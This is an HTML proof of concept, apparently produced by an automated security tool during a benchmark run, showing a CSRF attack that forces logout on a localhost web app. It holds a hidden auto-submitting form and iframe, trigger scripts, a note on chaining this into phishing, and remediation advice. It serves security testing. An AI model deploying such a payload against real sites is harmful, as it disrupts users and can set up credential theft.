<!-- 
POC: HTML POC demonstrating CSRF vulnerability on /logout endpoint. Opens in browser to show automatic logout attack when user has active session.
Target: ./repo
Created: 2025-10-30T20:00:03.366Z
Session: benchmark-XBEN-001-24-mhdu3kmr

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-001-24-mhdu3kmr/pocs/poc_csrf_logout.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF Logout Attack - Proof of Concept</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #d9534f;
            border-bottom: 3px solid #d9534f;
            padding-bottom: 10px;
        }
        .warning {
            background-color: #fcf8e3;
            border: 1px solid #faebcc;
            color: #8a6d3b;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
        .info {
            background-color: #d9edf7;
            border: 1px solid #bce8f1;
            color: #31708f;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
        code {
            background-color: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        .hidden-form {
            display: none;
        }
        button {
            background-color: #d9534f;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
        }
        button:hover {
            background-color: #c9302c;
        }
        .success {
            background-color: #dff0d8;
            border: 1px solid #d6e9c6;
            color: #3c763d;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
            display: none;
        }
        .attack-section {
            margin: 30px 0;
            padding: 20px;
            border: 2px solid #d9534f;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî¥ CSRF Logout Attack - Proof of Concept</h1>
        
        <div class="warning">
            <strong>‚ö†Ô∏è Warning:</strong> This is a Proof of Concept for security testing purposes only.
            Use only on systems you have permission to test.
        </div>

        <div class="info">
            <h3>Vulnerability Details:</h3>
            <ul>
                <li><strong>Endpoint:</strong> <code>POST /logout</code></li>
                <li><strong>Target:</strong> <code>http://localhost:8082</code></li>
                <li><strong>Issue:</strong> No CSRF token validation</li>
                <li><strong>Cookie Issue:</strong> Missing SameSite attribute</li>
            </ul>
        </div>

        <div class="attack-section">
            <h3>Attack Scenario:</h3>
            <p>
                When a logged-in user visits this page, the hidden form below will automatically 
                submit a POST request to the logout endpoint. Because:
            </p>
            <ol>
                <li>The logout endpoint has no CSRF protection</li>
                <li>The session cookie lacks the SameSite attribute</li>
                <li>The browser will include the session cookie in cross-origin POST requests</li>
            </ol>
            <p>
                The user will be forcibly logged out without their consent or knowledge.
            </p>
        </div>

        <h3>Testing Instructions:</h3>
        <ol>
            <li>Log in to the application at <code>http://localhost:8082</code></li>
            <li>Verify you have an active session (check you can access the dashboard)</li>
            <li>Open this HTML file in the same browser</li>
            <li>Click the "Execute CSRF Attack" button below</li>
            <li>The attack will submit the logout request automatically</li>
            <li>Return to <code>http://localhost:8082</code> and verify you've been logged out</li>
        </ol>

        <div style="text-align: center; margin: 30px 0;">
            <button onclick="executeAttack()">Execute CSRF Attack (Manual)</button>
            <button onclick="executeAutoAttack()" style="background-color: #5bc0de;">Auto-Execute on Page Load</button>
        </div>

        <div id="success-message" class="success">
            ‚úÖ CSRF attack executed! The logout request has been sent. Check if you've been logged out.
        </div>

        <!-- Hidden CSRF Form - This would be invisible on a real attacker site -->
        <form id="csrf-form" class="hidden-form" action="http://localhost:8082/logout" method="POST" target="csrf-iframe">
            <!-- No CSRF token required - that's the vulnerability! -->
        </form>

        <!-- Hidden iframe to capture response without navigation -->
        <iframe name="csrf-iframe" class="hidden-form"></iframe>

        <div class="info" style="margin-top: 30px;">
            <h3>Real-World Attack Scenario:</h3>
            <p>
                In a real attack, this form would be hidden on a malicious website (e.g., a forum post, 
                advertisement, or phishing site). The form would auto-submit when the page loads, 
                forcing any logged-in user who visits the malicious page to be logged out immediately.
            </p>
            <p>
                <strong>Attack Chain:</strong> Attacker forces logout ‚Üí User re-authenticates on phishing site ‚Üí Credentials stolen
            </p>
        </div>

        <h3>Remediation:</h3>
        <ul>
            <li>Implement CSRF tokens using Flask-WTF</li>
            <li>Set <code>SameSite=Lax</code> or <code>SameSite=Strict</code> on session cookies</li>
            <li>Validate CSRF tokens on all state-changing operations</li>
            <li>Consider using GET for logout with confirmation, or require re-authentication for sensitive actions</li>
        </ul>
    </div>

    <script>
        function executeAttack() {
            document.getElementById('csrf-form').submit();
            document.getElementById('success-message').style.display = 'block';
            setTimeout(function() {
                alert('CSRF attack executed! Check if you have been logged out from http://localhost:8082');
            }, 500);
        }

        function executeAutoAttack() {
            if (confirm('This will auto-execute the CSRF attack when the page loads. Continue?')) {
                // Simulate auto-execution
                setTimeout(executeAttack, 1000);
            }
        }

        // Uncomment the line below to make the attack auto-execute (real attack scenario)
        // window.onload = executeAttack;
    </script>
</body>
</html>